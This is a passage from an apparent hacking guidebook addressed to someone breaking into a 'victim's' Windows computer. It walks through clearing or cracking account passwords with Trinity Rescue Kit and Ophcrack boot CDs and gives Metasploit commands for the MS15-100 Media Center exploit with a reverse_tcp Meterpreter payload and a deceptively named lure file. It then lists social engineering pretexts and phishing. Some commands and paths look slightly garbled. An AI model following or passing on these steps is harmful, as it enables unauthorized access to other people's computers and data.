    The problem with this method is that though you can access the victim’s file system,
    you will not be able to access any encrypted files. If files or an operating system
    is encrypted using `Bitlocker` or `Truecrypt`, hacking using this method may be
    very difficult.


    ## Method 2: Using Trinity Rescue Kit


    This method involves some command line work. Follow the instruction below and
    all will be well.


    ### Instructions


    Go to the Trinity Rescue site and download the `.ISO` file. Burn the file onto
    a CD. Pop the CD into the computer’s drive and boot up.


    Once it has booted, go to the main menu, click on `Windows Password Resetting`,
    then click on `Interactive Winpass`.


    Follow the instructions that will appear on the screen. Pick which partition is
    to be edited and click on `Edit User data and Passwords`.


    Fill in the name of the user whose account is being edited. Choose option 1, `Clear
    User Password`.


    When you are finished, type an exclamation mark (`!`) to exit the menu.


    Press `q` to exit the `Winpass` menu.


    Restart the computer and you will be able to access the computer without requiring
    a password.


    ### Weaknesses


    Just like method 1 above, if the victim encrypts their files, you will not be
    able to get far using this method. This method will work if, like most people,
    the victim only encrypts certain files.


    ## Method 3: Using Ophcrack


    Unlike the previous two methods, this one will grant you access to everything,
    including the encrypted files. This method reveals the password the victim has
    set rather than bypassing it. It is also very effective in cracking Windows computers
    where the user has set up an authentication Microsoft account.


    ### Instructions


    Download the `ophcrack` Live CD (Vista version works best on `Win 7` and `8` computers).


    Burn the software to a CD and use it to boot the victim’s computer. This may take
    a while.


    You will see what resembles a desktop setting. Begin attempting to crack the user’s
    passwords. Alternatively, go to the original menu and click on `Text Mode` to
    start cracking passwords. You should be able to see passwords popping up at the
    top of the window. If the software does not find a password, it will inform you.


    Reboot and use the passwords retrieved to log on to Windows.


    ### Weaknesses


    Though Ophcrack is able to crack encrypted operating systems, it may not be able
    to hack every single password. The stronger, longer, and more complex a password
    is, the harder it is to crack.


    ## Method 4: Remote Hacking Using Metasploit


    Microsoft was forced to release a new patch in late 2015 after a hacker was able
    to remotely access the Windows operating systems. The `MS15-100` vulnerability
    was penetrated through the deployment of a `MCL` file. For hackers to effectively
    penetrate a system, it is important to adopt a multi-pronged approach. One of
    the most critical parts of a hack is the reconnaissance stage.


    Metasploit is a tool that allows a hacker to penetrate a system in order to test
    its security. It can be used to develop and execute an exploit code against a
    system remotely. The hack described below is aimed specifically against Windows
    Media Center that is installed on `Vista`, `7`, `8`, and `8.1` systems. For it
    to work, though, the victim has to be sent a `.mcl` link and open it.


    It is important to note that this hack requires more advanced skills than the
    previous ones. You are going to need some working knowledge of Metasploit and
    Linux.


    ### Instructions


    The first step is to run `Kali 2.0` or later on your system. The earlier versions
    of `Kali` just won’t cut it.


    Go to `Exploit-DB`. In the `Remote Code Execution Exploits` window, you will see
    the `MS15-100` exploit designated under `MS Windows Media Center`. Click on it.


    You will see the Metasploit code appear on the screen. This is required for the
    Metasploit framework. Copy it and paste it into one of `Kali`’s text files.


    Add a new module to your Metasploit framework. This step will have to be done
    first unless you are using the updated version where `Rapid7` have already added
    a new module to their framework. Give the new module a name - `ms15_100_mcl.rb`.


    After adding the new module, run Metasploit and search for `New Module`. Run the
    command:


    ```

    msf > search ms15_100.

    ```


    Load the new module by using the command:


    ```

    msf > use exploit/windows/fileformat/ms15_100_mcl

    ```


    The next step is to determine which requirements the new module needs.


    ```

    Msf > info

    ```


    There are two file names that need to be specified. The first is the `.mcl` file
    and is named `FILENAME`; the second one is the malicious file that will be sent
    to the victim’s system and is named `FILE_NAME`.


    Set the names of the `.mcl` file as well as the malicious one. The malicious file
    should be given a name that will prompt the victim to open it. For example, you
    can call it `worlds_smallest_laptop_ever.mcl`. Use the commands:


    ```

    msf > set FILENAME worlds_smallest_laptop_ever.mcl

    msf > set FILE_NAME smallest_laptop.exe

    ```


    The next step is to set the payload using Windows Meterpreter:


    ```

    msf > set PAYLOAD windows/meterpreter/reverse_tcp

    msf > exploit

    ```


    The file that needs to be sent to the victim can be found in `/root/msf4/local/worlds_smallest_laptop_ever.mcl`.


    Now that the `.mcl` file has been created in Metasploit and a share has been opened
    on the network, the file is ready to be sent to the victim.


    As soon as the `.mcl` file has been created in Metasploit and a share has been
    opened on the network, the file is ready to be sent to the victim. If the victim
    opens the file, the session does not open, type:


    ```

    msf > sessions -1

    ```


    Once the Meterpreter session opens, you can pretty much anything on the system,
    especially if the individual who clicked it is the administrator.


    # Chapter 7: Social Engineering


    Hacking using social engineering is all about taking advantage of the weakest
    component of every organization’s security - its people. In other words, social
    engineering is hacking the people rather than the system. The technique used is
    gaining the trust of people in order to maliciously exploit them and get information.
    Social engineering can be a very difficult hack to pull off, considering the boldness
    and skill it requires getting a total stranger to trust you. However, it is also
    the hardest hack to prevent because every individual is responsible for his or
    her security decisions.


    Social engineering is carried out when a malicious hacker pretends to be somebody
    else in order to acquire information that would be difficult to get by other means.
    The information acquired from the victim can then be used to steal files, destroy
    resources, commit fraud, or spy on an organization. Social engineering is distinct
    from physical security hack attempts, but they are normally carried out together.


    Examples of social engineering include:


    - Support personnel: Hackers claim that they require a user to install a software
    patch or update. They convince the victim to download the software, and the hackers
    are then able to remotely access the victim’s system.

    - Product vendors: Hackers pose as vendors of a particular product that the organization
    relies on, for example, the phone system or accounting software. They claim they
    need to update the existing systems and request administrator passwords.

    - Employees: Some employees may pretend that they have misplaced their access
    badges for accessing the organization’s data center. They inform the security
    department, who hand them keys, only for them to gain unauthorized entry to digital
    and physical records.

    - Phishing: Criminal hackers send malicious emails with links that trigger malware
    and viruses to be downloaded onto the victim’s computer. They are thus able to
    gain control of the system and steal data.

